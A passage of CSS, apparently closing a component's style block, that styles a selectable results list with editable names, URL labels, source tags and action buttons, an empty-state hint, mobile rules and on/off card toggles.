    align-items: center;
    gap: 6px;
    font-size: 11.5px;
    font-weight: 600;
    color: #94a3b8;
  }
  .ux-stat-dim { color: #475569; font-weight: 500; font-size: 10.5px; }
  .ux-results-actions { display: flex; gap: 5px; }
  .ux-select-all-btn {
    background: none;
    border: none;
    cursor: pointer;
    padding: 0;
    display: flex;
    align-items: center;
    flex-shrink: 0;
  }
  .ux-results-list {
    max-height: 260px;
    overflow-y: auto;
  }
  .ux-result-row {
    display: flex;
    align-items: flex-start;
    gap: 8px;
    padding: 7px 10px;
    border-bottom: 1px solid rgba(255,255,255,0.04);
    transition: background 100ms;
  }
  .ux-result-row:last-child { border-bottom: none; }
  .ux-result-row:hover { background: rgba(255,255,255,0.03); }
  .ux-result-deselected { opacity: 0.4; }
  .ux-result-check {
    background: none;
    border: none;
    cursor: pointer;
    padding: 2px 0 0;
    flex-shrink: 0;
    display: flex;
    align-items: center;
  }
  .ux-result-info {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }
  .ux-result-name {
    background: transparent;
    border: none;
    border-bottom: 1px solid transparent;
    color: #e2e8f0;
    font-size: 11.5px;
    font-weight: 600;
    padding: 0 0 1px;
    outline: none;
    font-family: inherit;
    width: 100%;
    transition: border-color 120ms;
  }
  .ux-result-name:hover { border-bottom-color: rgba(255,255,255,0.15); }
  .ux-result-name:focus { border-bottom-color: rgba(249,115,22,0.5); color: #fff; }
  .ux-result-name::placeholder { color: #334155; font-weight: 500; }
  .ux-result-url {
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    color: #38bdf8;
    word-break: break-all;
    line-height: 1.4;
    opacity: 0.8;
  }
  .ux-source-tag {
    display: inline-block;
    padding: 1px 6px;
    font-size: 9px;
    font-weight: 600;
    border-radius: 3px;
    background: rgba(124,58,237,0.12);
    border: 1px solid rgba(124,58,237,0.2);
    color: #a78bfa;
    max-width: fit-content;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    max-width: 200px;
  }
  .ux-result-btns {
    display: flex;
    gap: 3px;
    flex-shrink: 0;
    align-items: center;
    padding-top: 1px;
  }
  .ux-action-mini {
    background: none;
    border: none;
    color: #475569;
    cursor: pointer;
    width: 22px;
    height: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 4px;
    padding: 0;
    transition: all 100ms;
    font-family: inherit;
    font-size: 14px;
  }
  .ux-action-mini:hover { background: rgba(255,255,255,0.06); color: #94a3b8; }
  .ux-action-remove:hover { color: #ef4444 !important; background: rgba(239,68,68,0.1) !important; }

  /* Empty state */
  .ux-empty-hint {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    padding: 30px 20px 24px;
    text-align: center;
  }
  .ux-empty-icon { color: #334155; }
  .ux-empty-hint p {
    margin: 0;
    font-size: 12px;
    color: #64748b;
    font-weight: 500;
  }
  .ux-empty-sub {
    font-size: 10.5px !important;
    color: #475569 !important;
    font-weight: 400 !important;
    max-width: 320px;
    line-height: 1.5;
  }

  /* ── FC responsive ────────────────────────────────────────────────────── */
  @media (max-width: 768px) {
    .fc-toolbar { padding: 10px 12px; gap: 8px; }
    .fc-global-actions { display: none; }
    .fc-edit-grid { grid-template-columns: 1fr 1fr !important; }
    .fc-card-hdr { padding: 8px 12px; gap: 6px; }
    .fc-card-body { padding: 0 12px 8px 12px; }
    .fc-card-actions { flex-wrap: wrap; }
    .fc-edit-form { padding: 8px 12px; }
  }


  /* ── Card individual toggle ─────────────────────────────────────────────── */
  .fc-card-tog {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    height: 22px;
    padding: 2px 8px 2px 4px;
    border-radius: 12px;
    cursor: pointer;
    font-size: 10px;
    font-weight: 700;
    letter-spacing: 0.03em;
    transition: all 0.18s ease;
    border: 1px solid transparent;
  }
  .fc-card-tog-on {
    background: rgba(34, 197, 94, 0.15);
    border-color: rgba(34, 197, 94, 0.4);
    color: #22c55e;
  }
  .fc-card-tog-on:hover {
    background: rgba(34, 197, 94, 0.25);
    box-shadow: 0 0 10px rgba(34, 197, 94, 0.25);
  }
  .fc-card-tog-off {
    background: rgba(239, 68, 68, 0.12);
    border-color: rgba(239, 68, 68, 0.35);
    color: #ef4444;
  }
  .fc-card-tog-off:hover {
    background: rgba(239, 68, 68, 0.2);
  }
  .fct-knob {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    transition: background 0.18s;
  }
  .fc-card-tog-on .fct-knob {
    background: #22c55e;
    box-shadow: 0 0 5px #22c55e;
  }
  .fc-card-tog-off .fct-knob {
    background: #ef4444;
  }
</style>
